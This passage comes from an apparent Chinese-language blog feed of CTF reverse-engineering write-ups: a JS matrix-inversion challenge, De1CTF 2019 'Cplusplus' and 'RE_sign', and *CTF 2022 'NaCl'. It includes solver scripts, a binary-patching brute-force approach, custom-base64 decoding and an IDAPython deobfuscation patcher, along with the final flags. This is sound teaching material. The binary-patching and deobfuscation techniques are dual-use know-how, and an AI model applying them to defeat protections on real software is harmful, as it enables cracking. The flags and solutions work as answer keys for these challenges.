class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">data = e.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> t[<span class="hljs-number">0</span>].<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, a</span>) =&gt;</span> t.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e[a])).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">t</span> =&gt;</span> e.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">a, n</span>) =&gt;</span> e[n] * t[n]).<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> e + t)));<br></code></pre></td></tr></table></figure><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2010.00.17.png" alt="截屏2024-01-16 10.00.17" style="zoom:50%;" /><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">data = data.<span class="hljs-title function_">flatMap</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(<span class="hljs-number">100</span> * e) / <span class="hljs-number">100</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">e, t</span>) =&gt;</span> <span class="hljs-number">1</span> === e ? t + <span class="hljs-number">1</span> : e).<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e)<br></code></pre></td></tr></table></figure><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2010.03.13.png" alt="截屏2024-01-16 10.03.13" style="zoom:50%;" /><p>第二个语句像是取整操作，但会发现少了一个值，即第一个data的<code>data[0][1]=-0.000476...</code>，这个值没了，这里尝试一些特殊矩阵，比如单位矩阵</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2010.09.10.png" alt="截屏2024-01-16 10.09.10" style="zoom:50%;" /><p>正好对上，那么猜测前面的语句应该是矩阵乘法，我们就需要找到这个每个矩阵的逆，然后再接着反推出每次移动的方，简单求一下各个矩阵的逆</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2010.19.07.png" alt="截屏2024-01-16 10.19.07" style="zoom:50%;" /><p>正好都在32以内，侧面验证了猜想。</p><p>现在就有<code>i.i</code>，可以反推出<code>i.e</code>的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>a = [<br>    [[-<span class="hljs-number">0.035712653158569425</span>, -<span class="hljs-number">0.03287257405769594</span>, <span class="hljs-number">0.02334270751557671</span>, -<span class="hljs-number">0.02540569009549741</span>],<br>     [<span class="hljs-number">0.006411543162643718</span>, <span class="hljs-number">0.02983176158440242</span>, <span class="hljs-number">0.02174280291361509</span>, <span class="hljs-number">0.0067315240830360425</span>],<br>     [-<span class="hljs-number">0.010545458159016606</span>, -<span class="hljs-number">0.00814858244477348</span>, -<span class="hljs-number">0.042581311921773606</span>, <span class="hljs-number">0.020546352515626396</span>],<br>     [-<span class="hljs-number">0.033596009182061196</span>, -<span class="hljs-number">0.000705547992169411</span>, <span class="hljs-number">0.02680088640677326</span>, -<span class="hljs-number">0.051391718257793324</span>]],<br><br>    [[<span class="hljs-number">0.17638922081966382</span>, <span class="hljs-number">0.09011377379943657</span>, -<span class="hljs-number">0.2507513705723452</span>, -<span class="hljs-number">0.14779730737755375</span>],<br>     [<span class="hljs-number">0.055901970582484195</span>, <span class="hljs-number">0.015708171290764118</span>, -<span class="hljs-number">0.08718795489603928</span>, -<span class="hljs-number">0.034523214634888215</span>],<br>     [-<span class="hljs-number">0.08558020292437048</span>, -<span class="hljs-number">0.07923610054967736</span>, <span class="hljs-number">0.17700480152953701</span>, <span class="hljs-number">0.08977339387750669</span>],<br>     [-<span class="hljs-number">0.1294747286013282</span>, -<span class="hljs-number">0.05801667137404857</span>, <span class="hljs-number">0.20491595512778732</span>, <span class="hljs-number">0.13903433491935893</span>]],<br><br>    [[-<span class="hljs-number">1.4436222005842259</span>, <span class="hljs-number">0.33729308666017527</span>, <span class="hljs-number">0.5668938656280429</span>, -<span class="hljs-number">1.2835443037974683</span>],<br>     [<span class="hljs-number">5.040019474196689</span>, -<span class="hljs-number">1.136222005842259</span>, -<span class="hljs-number">1.895520934761441</span>, <span class="hljs-number">4.410126582278481</span>],<br>     [<span class="hljs-number">2.833203505355404</span>, -<span class="hljs-number">0.6585199610516066</span>, -<span class="hljs-number">1.0631937682570594</span>, <span class="hljs-number">2.4658227848101264</span>],<br>     [-<span class="hljs-number">1.0833495618305744</span>, <span class="hljs-number">0.23018500486854918</span>, <span class="hljs-number">0.4296007789678676</span>, -<span class="hljs-number">0.9417721518987342</span>]],<br><br>    [[-<span class="hljs-number">0.30391992395012024</span>, <span class="hljs-number">0.37225297768830734</span>, <span class="hljs-number">0.10770005032712632</span>, <span class="hljs-number">0.18833529049935693</span>],<br>     [<span class="hljs-number">0.2496784655818375</span>, -<span class="hljs-number">0.27545713806408323</span>, -<span class="hljs-number">0.055359838953195774</span>, -<span class="hljs-number">0.15288262595761337</span>],<br>     [-<span class="hljs-number">0.027456243359615277</span>, <span class="hljs-number">0.10879047139741654</span>, <span class="hljs-number">0.055359838953195774</span>, <span class="hljs-number">0.09732707040205782</span>],<br>     [<span class="hljs-number">0.20058155790415477</span>, -<span class="hljs-number">0.2713470894145278</span>, -<span class="hljs-number">0.11726220432813286</span>, -<span class="hljs-number">0.1713079460940558</span>]]<br>]<br>ans = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cac_ik</span>(<span class="hljs-params">i_e: np.array</span>):<br>    i_e = i_e.reshape(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>)[<span class="hljs-number">0</span>]<br>    i_e = <span class="hljs-built_in">list</span>(i_e)<br>    move = []<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> i_e:<br>        move.append(<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">round</span>(x) + <span class="hljs-number">32</span>)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>))<br>    i_x = -<span class="hljs-number">7</span><br>    i_y = -<span class="hljs-number">7</span><br>    i_k = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> move:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>):<br>            step = x[k:k + <span class="hljs-number">2</span>]<br>            <span class="hljs-keyword">if</span> step == <span class="hljs-string">&#x27;00&#x27;</span>:<br>                i_x = i_x + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">elif</span> step == <span class="hljs-string">&#x27;11&#x27;</span>:<br>                i_y = i_y + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">elif</span> step == <span class="hljs-string">&#x27;01&#x27;</span>:<br>                i_y = i_y - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">elif</span> step == <span class="hljs-string">&#x27;10&#x27;</span>:<br>                i_x = i_x - <span class="hljs-number">1</span><br>            i_k = i_k + <span class="hljs-number">211</span> * (i_x + <span class="hljs-number">9</span>) * (i_y + <span class="hljs-number">9</span>) * <span class="hljs-number">239</span> &amp; <span class="hljs-number">4294967295</span><br>    ans.append(i_k)<br><br>    <span class="hljs-comment"># for i in range(16):</span><br>    <span class="hljs-comment"># print(move)</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    aa = np.array(a[i])<br>    arr = np.linalg.inv(aa)<br>    cac_ik(arr)<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-comment"># [40645774, 130661539, 116339703, 150379278]</span><br></code></pre></td></tr></table></figure><p>最后直接在控制台控制变量就可以打印出flag</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-16%2010.58.42.png" alt="截屏2024-01-16 10.58.42" style="zoom: 67%;" /><p>（1.需要使用https协议，2.需要到终点后手动再移动一下）</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>JS</tag>
      
      <tag>GO</tag>
      
      <tag>z3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>De1CTF 2019 (一)</title>
    <link href="/2024/01/14/De1CTF%202019/"/>
    <url>/2024/01/14/De1CTF%202019/</url>
    
    <content type="html"><![CDATA[<p>Cplusplus，RE_sign</p><span id="more"></span><h2 id="Cplusplus"><a href="#Cplusplus" class="headerlink" title="Cplusplus"></a>Cplusplus</h2><h3 id="总体分析"><a href="#总体分析" class="headerlink" title="总体分析"></a>总体分析</h3><p>程序的输入和关键比较函数都比较明显，直接看关键的函数</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.21.49.png" alt="截屏2024-01-14 00.21.49" style="zoom:50%;" /><p>在这个函数里面里面，出现了三次<code>sub_140005a90</code>这个函数，这个函数经过一点🤏时间的调试后，发现就是字符串转16进制，并且限定输入只能是数字而不能是字符。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.22.22.png" alt="截屏2024-01-14 00.22.22" style="zoom: 50%;" /><p>这里用了三次这个函数，也就是把输入转了三次，猜测到这里就是把flag分成三段，类似这样<code>111_111_111</code>，这里下划线就是分隔符。</p><h3 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h3><p>然后再接着看这个<code>sub_140006910</code>，直接对着F5的代码调试的时候总会有奇奇怪怪的事情，应该IDA没有很好识别，所以转去看汇编，值得注意的是这里有两个挺关键的比较函数，位与21行和23行。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.25.55.png" alt="截屏2024-01-14 00.25.55" style="zoom:50%;" /><p>将断点下在这里，动态调试会得到这样的汇编</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.31.26.png" alt="截屏2024-01-14 00.31.26" style="zoom:50%;" /><p>这里的<code>al</code>就是之前提及的分隔符，<code>[rsi+18h]</code>就是这个分隔符，如果不在这里加分隔符那么上面的<code>loc_14000599c</code>就会直接退出。查看<code>[rsi+18]</code>就可以得到这个分隔符，下面的汇编也是如此。总之现在得到了两个分隔符分别是@和#，那么输入的形式就是<code>111@111#111</code></p><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>经过第一个格式check后，进入第二个内容check，也就是检查每个部分的flag是否正确。</p><p>先看第一部分flag的检查</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.35.43.png" alt="截屏2024-01-14 00.35.43" style="zoom:50%;" /><p>这里的<code>v45</code>就是第一部分flag的16进制，即输入<code>78</code>那么<code>v45=4E</code>，就是<code>78=0x4e</code>。这个函数会首先限制输入小于<code>0x6f</code>，然后走一个十分复杂的算法，看其他WP说这是梅森旋转算法，不懂。但可以找到一个很关键的比较语句</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.39.34.png" alt="截屏2024-01-14 00.39.34" style="zoom:50%;" /><p>不管中间算法怎样复杂，这里肯定是不能<code>exit</code>的，而且输入范围也比较小，那么就可以考虑爆破。这里爆破的基本思路就是不断改变输入的值，然后通过if语句。</p><p>爆破可以考虑以下两种手段，</p><blockquote><ol><li>直接dump源码</li><li>从源程序patch</li></ol></blockquote><p>这里用patch源程序方式。</p><p>先在IDA中找到对应位置</p><p>这里是与0x6f比较</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.42.49.png" alt="截屏2024-01-14 00.42.49" style="zoom:50%;" /><p>x64dbg打开，注意这里<code>rbx</code>寄存器存放的就是第一部分flag值的内存地址</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.46.05.png" alt="截屏2024-01-14 00.46.05" style="zoom:50%;" /><p>这里是if判断语句</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.43.29.png" alt="截屏2024-01-14 00.43.29" style="zoom:50%;" /><p>x64dbg打开，<code>rbx</code>寄存器仍没有发生变化。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.48.39.png" alt="截屏2024-01-14 00.48.39" style="zoom:50%;" /><p>那么就可以通过rbx寄存器爆破flag，具体patch如下</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.51.13.png" alt="截屏2024-01-14 00.51.13" style="zoom:50%;" /><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.51.39.png" alt="截屏2024-01-14 00.51.39" style="zoom:50%;" /><p>其余部分不变，然后在<code>140002b07</code>下一条语句处下断点然后运行，程序断下后再查看<code>rbx</code>寄存器内存对应值即可。最终也就是爆破得到第一部分flag为<code>78</code></p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>这里的flag就比较简单了，就是数组的简单索引</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.55.38.png" alt="截屏2024-01-14 00.55.38" style="zoom:50%;" /><p>得到第二部分是<code>20637</code></p><h3 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h3><p>这部分只有一条语句，不过IDA识别有问题，直接看汇编就好</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.56.22.png" alt="截屏2024-01-14 00.56.22" style="zoom:50%;" /><p>这里<code>[rbp+0x0E0h+var_58]</code>就是<code>0x22h</code>，只是之前那个梅森算法的输出，<code>[rbp+0x0E0h+var_58+4]</code>是第三部分flag。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-14%2000.57.09.png" alt="截屏2024-01-14 00.57.09" style="zoom:50%;" /><p>所以这里很明确</p><blockquote><p>flag_3 % 0x22 &#x3D;0xc</p><p>flag_3 &#x2F; 0x22 &#x3D; 3</p></blockquote><p>那么flag_3 &#x3D; 3 * 0x22 + 0xc &#x3D; 114</p><p>所以flag就是<code>78@20637#114</code></p><h2 id="RE-sign"><a href="#RE-sign" class="headerlink" title="RE_sign"></a>RE_sign</h2><p>主程序逻辑比较明显</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.03.03.png"></p><p>大意就是输入flag，然后经过<code>sub_401233</code>进行加密，中间进行一些运算然后去到33行的if判读语句进行判断。经过简单调试可以发现，<code>sub_401233</code>高度疑似是一个变表的base64操作，中间21行至31行不会对输入进行操作。</p><p>现在就需要跟进<code>sub_401233</code>进行分析。</p><p><code>sub_401233</code>函数很长，很多if、while等语句，逐一分析不太现实。程序中存在原base64的字符串表，并且在这个函数中有所引用，可以基本推测变表是基于原表进行变化。</p><p>往下审计过程中会发现有一个特殊的判断语句<code>if (i &gt; 63)</code>，而base的表正是64为长度，推测这里可能是生成变表，于是打个断点，看看会得到什么</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.10.50.png"></p><p>在if处下断点，在Hex View中可以发现新的特殊的字符串</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.18.34.png"></p><p>然后打断点跳出循环</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.30.53.png"></p><p>点击v221变量去它的地址处，找附近有没有可能的base64字符串</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.35.56.png"></p><p>找到类似的字符串<code>0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/</code>，经过验证，这个就是变表后的base64表。</p><p>继续往后分析进入到于flag比较的地方，这里面也挺多操作，但是可以从后往前看。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.37.51.png"></p><p>首先很显然不能进入<code>else</code>里面，否则会返回0值，而要返回1则需要<code>v34==49</code>，推测是比较成功的密文字符数量，继续往前倒推可以看到71行的if判断语句，这里这是涉及到<code>break</code>操作，而想要进入到这个if语句判断，前面还有一个if需要满足</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.40.10.png"></p><p>这里的v5是经过变表base64后的字符串，其长度需要为48，那么原始字符串就需要是33～36个字节。</p><p>进入<code>sub_402160</code>查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.41.52.png"></p><p>这里又用到了原始的base64表，并且还用到了加密了的base64输入，猜测这里是返回加密的字符在原表中的索引，经过调试发现确实如此，而原始判断左边v19则是密文。</p><p>至此加密逻辑就已经很清晰了，首先进行变表的base64加密，变表为<code>0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/</code>，再把加密字符在原base64表中的索引作为最后的密文，那么解密就很简单了，</p><p>先得到加密的base64密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">8</span>, <span class="hljs-number">59</span>, <span class="hljs-number">1</span>, <span class="hljs-number">32</span>, <span class="hljs-number">7</span>, <span class="hljs-number">52</span>, <span class="hljs-number">9</span>, <span class="hljs-number">31</span>, <span class="hljs-number">24</span>, <span class="hljs-number">36</span>, <span class="hljs-number">19</span>, <span class="hljs-number">3</span>, <span class="hljs-number">16</span>, <span class="hljs-number">56</span>, <span class="hljs-number">9</span>, <span class="hljs-number">27</span>, <span class="hljs-number">8</span>, <span class="hljs-number">52</span>, <span class="hljs-number">19</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">34</span>, <span class="hljs-number">18</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">18</span>, <span class="hljs-number">3</span>, <span class="hljs-number">15</span>, <span class="hljs-number">34</span>, <span class="hljs-number">18</span>, <span class="hljs-number">23</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">41</span>, <span class="hljs-number">34</span>, <span class="hljs-number">6</span>, <span class="hljs-number">36</span>, <span class="hljs-number">50</span>, <span class="hljs-number">36</span>, <span class="hljs-number">15</span>, <span class="hljs-number">31</span>, <span class="hljs-number">43</span>, <span class="hljs-number">36</span>, <span class="hljs-number">3</span>, <span class="hljs-number">21</span>, <span class="hljs-number">65</span>, <span class="hljs-number">65</span>]<br><br>table = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>    <span class="hljs-built_in">print</span>(table[i-<span class="hljs-number">1</span>],end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># H6AfGzIeXjSCP3IaHzSBHhRCEFRCOhRWHAohFjxjOeqjCU==</span><br></code></pre></td></tr></table></figure><p>再base64解密即可</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-20%2000.45.48.png"></p><p><code>de1ctf&#123;E_L4nguag3_1s_K3KeK3_N4Ji4&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>*CTF 2022</title>
    <link href="/2024/01/01/Nacl/"/>
    <url>/2024/01/01/Nacl/</url>
    
    <content type="html"><![CDATA[<p>NaClJump</p><span id="more"></span><h2 id="NaCl"><a href="#NaCl" class="headerlink" title="NaCl"></a>NaCl</h2><p>利用字符串可以快速的定位到关键函数</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.02.55.png"></p><p>可以发现关键是函数&#96;sub_8080900，跟进该函数</p><p>在这函数里面，发现了大量的<code>jmp</code>块</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.05.33.png"></p><p>也就是形如<code>lea lea mov jmp</code>的组合</p><p>同样还有大量的<code>jmp rdi</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.06.54.png" alt="截屏2024-01-01 02.06.54"></p><p>经过调试可以发现，这里的<code>lea lea mov jmp</code>充当了call指令，<code>lea mov and lea jmp</code>充当了<code>retn</code>指令，实际上就是把<code>r15</code>当作<code>rsp</code>来使用。这样就使得函数块割裂，导致IDA识别不准</p><blockquote><p>在由 Microsoft Visual C++ 编译器生成的代码中，经常可以找到函数块<br>.<br>编译器移动不常执行的代码段，用以将经常执行的代码段“挤入”不大可能被换出的内存页，由此便产生了函数块<br>.<br>如果一个函数以这种方式被分割，IDA 会通过跟踪指向每个块的跳转，尝试定位所有相关的块<br>.<br>多数情况下，IDA 都能找到所有这些块，并在函数的头部列出每一个块</p><p>.<br>有时候，IDA 可能无法确定与函数关联的每一个块，或者函数可能被错误地识别成函数块，而非函数本身<br>.<br>在这种情况下，需要创建自己的函数块，或删除现有的函数块<br>.<br>在反汇编代码清单中，函数块就叫做函数块；在 IDA 的菜单系统中，函数块叫做函数尾（function tail）<br>.<br>要删除现有的函数块，将光标放在要删除的块中的任何一行上，然后选择 Edit -&gt; Functions -&gt; Remove Function Tail<br>.<br>在初次将文件加载到 IDA 时，取消选择 Create function tails 加载器选项，IDA 将不创建函数块<br>.<br>如果禁用了函数尾，已经包含函数尾的函数将包含指向函数边界以外区域的跳转，IDA 会在反汇编代码清单左侧的箭头窗口中用红线和箭头突出显示这些跳转</p></blockquote><p>基于此，可以等价的patch这两组指令，使用IDApython会相当方便。这里还要注意需要将Align块也要nop填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python">start = <span class="hljs-number">0x807FEC0</span><br>end = <span class="hljs-number">0x8080AD1</span><br><br>call = [<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;mov&#x27;</span>,<span class="hljs-string">&#x27;jmp&#x27;</span>]<br>ret = [<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;mov&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>,<span class="hljs-string">&#x27;lea&#x27;</span>,<span class="hljs-string">&#x27;jmp&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nop</span>(<span class="hljs-params">s,e</span>):<br>    <span class="hljs-keyword">while</span> s &lt; e:<br>        patch_byte(s,<span class="hljs-number">0x90</span>)<br>        s += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_call</span>():<br>    des = idc.get_operand_value(tmp[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>)<br>    nop(tmp[<span class="hljs-number">3</span>]+<span class="hljs-number">5</span>,des)<br>    nop(tmp[<span class="hljs-number">0</span>],tmp[<span class="hljs-number">3</span>])<br>    patch_byte(tmp[<span class="hljs-number">3</span>],<span class="hljs-number">0xe8</span>)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_ret</span>():<br>    nop(tmp[<span class="hljs-number">0</span>],tmp[<span class="hljs-number">4</span>])    <br>    patch_byte(tmp[<span class="hljs-number">4</span>],<span class="hljs-number">0x90</span>)<br>    patch_byte(tmp[<span class="hljs-number">4</span>]+<span class="hljs-number">1</span>,<span class="hljs-number">0xc3</span>)<br>    <br>tmp = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br><br><span class="hljs-keyword">while</span> start &lt; end:<br>    tmp[<span class="hljs-number">0</span>]=start<br>    tmp[<span class="hljs-number">1</span>]=next_head(tmp[<span class="hljs-number">0</span>])<br>    tmp[<span class="hljs-number">2</span>]=next_head(tmp[<span class="hljs-number">1</span>])<br>    tmp[<span class="hljs-number">3</span>]=next_head(tmp[<span class="hljs-number">2</span>])<br>    tmp[<span class="hljs-number">4</span>]=next_head(tmp[<span class="hljs-number">3</span>])   <br>   <span class="hljs-comment"># print(hex(start))</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> idc.print_insn_mnem(tmp[i]) != call[i]:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        patch_call()<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> idc.print_insn_mnem(tmp[i]) != ret[i]:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        patch_ret()<br>        <br>    start = idc.next_head(start)<br></code></pre></td></tr></table></figure><p>patch完后的汇编大概长这样子</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-01%2002.14.55.png"></p><p>还需要注意的地方是，IDA可能会错误识别函数的边界，需要记住只有<code>retn</code>才是函数的结束，在<code>retn</code>的地方按<code>e</code>标记为函数结束。还有其他应该识别为函数的，比如<code>call sub_xxxx</code>，但是相应地址可能只是<code>loc_xxxx</code>，那就要按<code>p</code>重新分析一下为函数；函数体内不应该存在的<code>sub_xxxx</code>，则需要先按<code>u</code>转为未定义，再按<code>c</code>转为代码。</p><p>最后的反汇编应该是这样子</p><p><img 